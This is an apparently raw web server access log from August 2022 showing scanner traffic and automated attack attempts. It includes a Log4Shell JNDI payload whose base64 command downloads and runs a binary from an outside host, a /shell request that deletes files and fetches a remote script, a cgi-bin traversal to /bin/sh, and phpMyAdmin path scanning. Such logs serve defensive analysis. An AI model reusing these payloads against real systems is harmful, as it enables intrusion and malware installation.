162.142.125.212 - - [11/Aug/2022:20:56:09 +0000] "GET / HTTP/1.1" 200 109 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
162.142.125.212 - - [11/Aug/2022:20:56:10 +0000] "PRI * HTTP/2.0" 400 226 "-" "-"
66.240.192.82 - - [11/Aug/2022:21:33:51 +0000] "\x16\x03\x01" 400 226 "-" "-"
66.240.192.82 - - [11/Aug/2022:21:34:34 +0000] "GET / HTTP/1.1" 200 109 "-" "'Mozilla/5.0 project_patchwatch'"
185.7.214.117 - - [11/Aug/2022:21:40:26 +0000] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 200 109 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
128.14.134.170 - - [11/Aug/2022:22:09:46 +0000] "GET / HTTP/1.1" 200 109 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
185.7.214.117 - - [11/Aug/2022:22:17:12 +0000] "GET /console/ HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
208.67.107.247 - - [11/Aug/2022:22:33:12 +0000] "GET / HTTP/1.1" 200 109 "-" "Linux Gnu (cow)"
73.251.211.213 - - [11/Aug/2022:22:47:36 +0000] "GET / HTTP/1.1" 200 109 "-" "-"
138.68.18.123 - - [11/Aug/2022:22:48:00 +0000] "GET / HTTP/1.1" 200 109 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36"
185.196.220.70 - - [11/Aug/2022:22:55:35 +0000] "GET / HTTP/1.1" 200 109 "-" "Linux Gnu (cow)"
185.7.214.117 - - [11/Aug/2022:22:56:43 +0000] "POST /Autodiscover/Autodiscover.xml HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
118.73.149.194 - - [11/Aug/2022:23:01:40 +0000] "GET / HTTP/1.0" 200 109 "-" "-"
183.136.225.35 - - [11/Aug/2022:23:38:37 +0000] "GET / HTTP/1.1" 200 109 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:47.0) Gecko/20100101 Firefox/47.0"
183.136.225.35 - - [11/Aug/2022:23:38:57 +0000] "GET / HTTP/1.1" 200 109 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE"
185.7.214.117 - - [12/Aug/2022:00:10:41 +0000] "GET /_ignition/execute-solution HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
43.129.219.189 - - [12/Aug/2022:00:31:47 +0000] "GET / HTTP/1.1" 200 109 "-" "'Mozilla/5.0"
185.7.214.117 - - [12/Aug/2022:00:35:20 +0000] "GET / HTTP/1.1" 200 109 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
46.249.32.169 - - [12/Aug/2022:01:01:49 +0000] "GET / HTTP/1.1" 200 109 "-" "Linux Gnu (cow)"
185.7.214.117 - - [12/Aug/2022:01:36:43 +0000] "POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1" 400 226 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
172.104.242.173 - - [12/Aug/2022:02:20:41 +0000] "\xba\xabd\xa1EZC\xdbM\x87\xee^\xfd\xbf\x159 X\xd4>\x12\x98\xc4<\xe0\x13\xcf" 400 226 "-" "-"
185.7.214.117 - - [12/Aug/2022:02:31:05 +0000] "GET / HTTP/1.1" 200 109 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
192.241.220.228 - - [12/Aug/2022:02:47:58 +0000] "GET / HTTP/1.1" 200 109 "-" "Mozilla/5.0 zgrab/0.x"
185.7.214.117 - - [12/Aug/2022:03:24:08 +0000] "GET /actuator/gateway/routes HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
178.211.139.4 - - [12/Aug/2022:03:27:09 +0000] "GET / HTTP/1.1" 200 109 "t('${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//168.138.128.171:1389/TomcatBypass/Command/Base64/d2dldCBodHRwOi8vMTY4LjEzOC4xMjguMTcxL2xvbC9zbXRwc2VydmVyOyBjdXJsIC1PIGh0dHA6Ly8xNjguMTM4LjEyOC4xNzEvbG9sL3NtdHBzZXJ2ZXI7IGNobW9kIDc3NyBzbXRwc2VydmVyOyAuL3NtdHBzZXJ2ZXIgcnVubmVy}')" "t('${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//168.138.128.171:1389/TomcatBypass/Command/Base64/d2dldCBodHRwOi8vMTY4LjEzOC4xMjguMTcxL2xvbC9zbXRwc2VydmVyOyBjdXJsIC1PIGh0dHA6Ly8xNjguMTM4LjEyOC4xNzEvbG9sL3NtdHBzZXJ2ZXI7IGNobW9kIDc3NyBzbXRwc2VydmVyOyAuL3NtdHBzZXJ2ZXIgcnVubmVy}')"
185.42.224.148 - - [12/Aug/2022:03:27:41 +0000] "GET / HTTP/1.1" 200 109 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
221.226.14.142 - - [12/Aug/2022:04:09:24 +0000] "GET / HTTP/1.1" 200 109 "-" "-"
61.147.15.65 - - [12/Aug/2022:04:24:37 +0000] "\x16\x03\x01" 400 226 "-" "-"
61.147.15.65 - - [12/Aug/2022:04:26:11 +0000] "GET / HTTP/1.1" 200 109 "-" "Mozilla/5.0 (X11; FreeBSD amd64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.65 Safari/535.11"
61.147.15.67 - - [12/Aug/2022:04:28:06 +0000] "GET / HTTP/1.1" 200 109 "-" "Dalvik/2.1.0 (Linux; U; Android 9.0; ZTE BA520 Build/MRA58K)"
61.147.15.67 - - [12/Aug/2022:04:28:12 +0000] "\x16\x03\x01" 400 226 "-" "-"
61.147.15.67 - - [12/Aug/2022:04:28:27 +0000] "GET / HTTP/1.1" 200 109 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11) AppleWebKit/601.1.27 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/601.1.27"
61.147.15.67 - - [12/Aug/2022:04:30:39 +0000] "GET /favicon.ico HTTP/1.1" 404 196 "-" "Dalvik/2.1.0 (Linux; U; Android 9.0; ZTE BA520 Build/MRA58K)"
185.196.220.70 - - [12/Aug/2022:04:32:03 +0000] "GET / HTTP/1.1" 200 109 "-" "Linux Gnu (cow)"
61.147.15.67 - - [12/Aug/2022:04:38:42 +0000] "\x16\x03\x01" 400 226 "-" "-"
34.230.71.174 - - [12/Aug/2022:05:19:38 +0000] "GET / HTTP/1.1" 200 109 "-" "Mozilla/5.0 (Windows NT 6.2;en-US) AppleWebKit/537.32.36 (KHTML, live Gecko) Chrome/54.0.3031.54 Safari/537.32"
205.210.31.132 - - [12/Aug/2022:07:25:17 +0000] "GET / HTTP/1.0" 200 109 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
183.136.225.35 - - [12/Aug/2022:07:36:32 +0000] "GET / HTTP/1.1" 200 109 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:47.0) Gecko/20100101 Firefox/47.0"
36.67.251.53 - - [12/Aug/2022:07:44:03 +0000] "GET / HTTP/1.1" 200 109 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
77.65.45.38 - - [12/Aug/2022:07:47:15 +0000] "GET / HTTP/1.1" 200 109 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
205.210.31.2 - - [12/Aug/2022:08:34:39 +0000] "\x16\x03\x01" 400 226 "-" "-"
205.210.31.150 - - [12/Aug/2022:08:39:46 +0000] "GET / HTTP/1.1" 200 109 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
151.245.25.164 - - [12/Aug/2022:10:21:26 +0000] "GET / HTTP/1.1" 200 109 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
185.180.143.18 - - [12/Aug/2022:10:25:19 +0000] "GET / HTTP/1.1" 200 109 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
185.196.220.70 - - [12/Aug/2022:11:46:57 +0000] "GET / HTTP/1.1" 200 109 "-" "Linux Gnu (cow)"
179.43.155.171 - - [12/Aug/2022:11:49:52 +0000] "\x16\x03\x01" 400 226 "-" "-"
179.43.155.171 - - [12/Aug/2022:11:49:52 +0000] "GET /static../.git/config HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Linux; Android 12; SM-N986U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Mobile Safari/537.36"
195.3.222.18 - - [12/Aug/2022:12:02:51 +0000] "GET / HTTP/1.1" 200 109 "-" "-"
195.3.222.18 - - [12/Aug/2022:12:02:51 +0000] "POST /HNAP1/ HTTP/1.1" 404 196 "-" "Mozila/5.0"
66.240.192.82 - - [12/Aug/2022:12:05:07 +0000] "\x16\x03\x01" 400 226 "-" "-"
66.240.192.82 - - [12/Aug/2022:12:05:55 +0000] "GET / HTTP/1.1" 200 109 "-" "'Mozilla/5.0 project_patchwatch'"
65.49.20.69 - - [12/Aug/2022:12:50:12 +0000] "GET / HTTP/1.1" 200 109 "-" "-"
118.91.176.20 - - [12/Aug/2022:13:15:00 +0000] "GET / HTTP/1.1" 200 109 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
180.124.155.105 - - [12/Aug/2022:13:23:20 +0000] "GET / HTTP/1.1" 200 109 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
159.203.66.114 - - [12/Aug/2022:13:25:56 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 196 "http://140.238.86.79:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
185.7.214.117 - - [12/Aug/2022:15:08:35 +0000] "POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
23.251.102.90 - - [12/Aug/2022:15:19:29 +0000] "GET / HTTP/1.1" 200 109 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
193.118.53.210 - - [12/Aug/2022:15:21:12 +0000] "GET / HTTP/1.1" 200 109 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
31.156.251.208 - - [12/Aug/2022:15:32:04 +0000] "GET /shell?cd+/tmp;rm+-rf+*;wget+synss.cf/jaws;sh+/tmp/jaws HTTP/1.1" 404 196 "-" "Hello, world"
217.44.242.166 - - [12/Aug/2022:15:36:42 +0000] "GET /administrator/db/index.php?lang=en HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
217.44.242.166 - - [12/Aug/2022:15:36:42 +0000] "GET /sql/webadmin/index.php?lang=en HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
217.44.242.166 - - [12/Aug/2022:15:36:43 +0000] "GET /db/phpMyAdmin-3/index.php?lang=en HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
217.44.242.166 - - [12/Aug/2022:15:36:43 +0000] "GET /phpMyAdmin3/index.php?lang=en HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
217.44.242.166 - - [12/Aug/2022:15:36:43 +0000] "GET /admin/db/index.php?lang=en HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
217.44.242.166 - - [12/Aug/2022:15:36:43 +0000] "GET /db/phpMyAdmin-5/index.php?lang=en HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
217.44.242.166 - - [12/Aug/2022:15:36:43 +0000] "GET /phpMyAdmin-4.9.7/index.php?lang=en HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
217.44.242.166 - - [12/Aug/2022:15:36:43 +0000] "GET /phpMyAdmin/index.php?lang=en HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
217.44.242.166 - - [12/Aug/2022:15:36:43 +0000] "GET /sql/sql/index.php?lang=en HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
217.44.242.166 - - [12/Aug/2022:15:36:43 +0000] "GET /admin/sysadmin/index.php?lang=en HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
217.44.242.166 - - [12/Aug/2022:15:36:43 +0000] "GET /php-my-admin/index.php?lang=en HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
217.44.242.166 - - [12/Aug/2022:15:36:43 +0000] "GET /phpmyadmin2012/index.php?lang=en HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
217.44.242.166 - - [12/Aug/2022:15:36:43 +0000] "GET /phpmyadmin2020/index.php?lang=en HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
217.44.242.166 - - [12/Aug/2022:15:36:43 +0000] "GET /mysql/dbadmin/index.php?lang=en HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
217.44.242.166 - - [12/Aug/2022:15:36:43 +0000] "GET /sql/phpmanager/index.php?lang=en HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
217.44.242.166 - - [12/Aug/2022:15:36:43 +0000] "GET /phpmyadmin2/index.php?lang=en HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
217.44.242.166 - - [12/Aug/2022:15:36:43 +0000] "GET /database/index.php?lang=en HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
217.44.242.166 - - [12/Aug/2022:15:36:43 +0000] "GET /sql/php-myadmin/index.php?lang=en HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
217.44.242.166 - - [12/Aug/2022:15:36:43 +0000] "GET /db/phpmyadmin/index.php?lang=en HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
217.44.242.166 - - [12/Aug/2022:15:36:43 +0000] "GET /administrator/admin/index.php?lang=en HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
217.44.242.166 - - [12/Aug/2022:15:36:43 +0000] "GET /MyAdmin/index.php?lang=en HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
217.44.242.166 - - [12/Aug/2022:15:36:43 +0000] "GET /phpmyadmin2013/index.php?lang=en HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
217.44.242.166 - - [12/Aug/2022:15:36:43 +0000] "GET /sql/phpMyAdmin/index.php?lang=en HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
217.44.242.166 - - [12/Aug/2022:15:36:43 +0000] "GET /admin/web/index.php?lang=en HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
217.44.242.166 - - [12/Aug/2022:15:36:43 +0000] "GET /phpmyadmin2016/index.php?lang=en HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
217.44.242.166 - - [12/Aug/2022:15:36:43 +0000] "GET /administrator/phpmyadmin/index.php?lang=en HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
217.44.242.166 - - [12/Aug/2022:15:36:43 +0000] "GET /phpmyadmin_/index.php?lang=en HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
217.44.242.166 - - [12/Aug/2022:15:36:43 +0000] "GET /phpMyAdmin-5.1.3/index.php?lang=en HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
217.44.242.166 - - [12/Aug/2022:15:36:43 +0000] "GET /mysql/db/index.php?lang=en HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
217.44.242.166 - - [12/Aug/2022:15:36:43 +0000] "GET /phpMyAdmin-5.1.2/index.php?lang=en HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
217.44.242.166 - - [12/Aug/2022:15:36:43 +0000] "GET /wp-content/plugins/portable-phpmyadmin/wp-pma-mod/index.php?lang=en HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
217.44.242.166 - - [12/Aug/2022:15:36:43 +0000] "GET /phpmyadmin3/index.php?lang=en HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
217.44.242.166 - - [12/Aug/2022:15:36:43 +0000] "GET /phpmyadmin2014/index.php?lang=en HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
217.44.242.166 - - [12/Aug/2022:15:36:43 +0000] "GET /mysql/admin/index.php?lang=en HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
217.44.242.166 - - [12/Aug/2022:15:36:43 +0000] "GET /phpMyAdmin2/index.php?lang=en HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
217.44.242.166 - - [12/Aug/2022:15:36:43 +0000] "GET /sql/phpmyadmin5/index.php?lang=en HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
217.44.242.166 - - [12/Aug/2022:15:36:43 +0000] "GET /sql/myadmin/index.php?lang=en HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
217.44.242.166 - - [12/Aug/2022:15:36:43 +0000] "GET /db/phpMyAdmin3/index.php?lang=en HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
217.44.242.166 - - [12/Aug/2022:15:36:44 +0000] "GET /sql/sqlweb/index.php?lang=en HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
217.44.242.166 - - [12/Aug/2022:15:36:44 +0000] "GET /mysql-admin/index.php?lang=en HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
217.44.242.166 - - [12/Aug/2022:15:36:44 +0000] "GET /db/dbweb/index.php?lang=en HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
217.44.242.166 - - [12/Aug/2022:15:36:44 +0000] "GET /program/index.php?lang=en HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
217.44.242.166 - - [12/Aug/2022:15:36:44 +0000] "GET /db/phpmyadmin4/index.php?lang=en HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
217.44.242.166 - - [12/Aug/2022:15:36:44 +0000] "GET /phpmyadmin4/index.php?lang=en HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
217.44.242.166 - - [12/Aug/2022:15:36:44 +0000] "GET /mysql/index.php?lang=en HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
217.44.242.166 - - [12/Aug/2022:15:36:44 +0000] "GET /_phpmyadmin_/index.php?lang=en HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
217.44.242.166 - - [12/Aug/2022:15:36:44 +0000] "GET /phpmyAdmin/index.php?lang=en HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
217.44.242.166 - - [12/Aug/2022:15:36:44 +0000] "GET /phpMyAdmin-4/index.php?lang=en HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
217.44.242.166 - - [12/Aug/2022:15:36:44 +0000] "GET /phpMyAdmin1/index.php?lang=en HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
217.44.242.166 - - [12/Aug/2022:15:36:44 +0000] "GET /db/phpmyadmin5/index.php?lang=en HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
217.44.242.166 - - [12/Aug/2022:15:36:44 +0000] "GET /mysql/web/index.php?lang=en HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
217.44.242.166 - - [12/Aug/2022:15:36:44 +0000] "GET /db/phpmyadmin3/index.php?lang=en HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
217.44.242.166 - - [12/Aug/2022:15:36:44 +0000] "GET /sql/phpmyadmin3/index.php?lang=en HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
217.44.242.166 - - [12/Aug/2022:15:36:44 +0000] "GET /mysqladmin/index.php?lang=en HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
217.44.242.166 - - [12/Aug/2022:15:36:44 +0000] "GET /phpMyAdmin5/index.php?lang=en HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
217.44.242.166 - - [12/Aug/2022:15:36:44 +0000] "GET /sql/sqladmin/index.php?lang=en HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
217.44.242.166 - - [12/Aug/2022:15:36:44 +0000] "GET /phpMyAdmin4/index.php?lang=en HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
217.44.242.166 - - [12/Aug/2022:15:36:44 +0000] "GET /_phpMyAdmin/index.php?lang=en HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
217.44.242.166 - - [12/Aug/2022:15:36:44 +0000] "GET /1phpmyadmin/index.php?lang=en HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
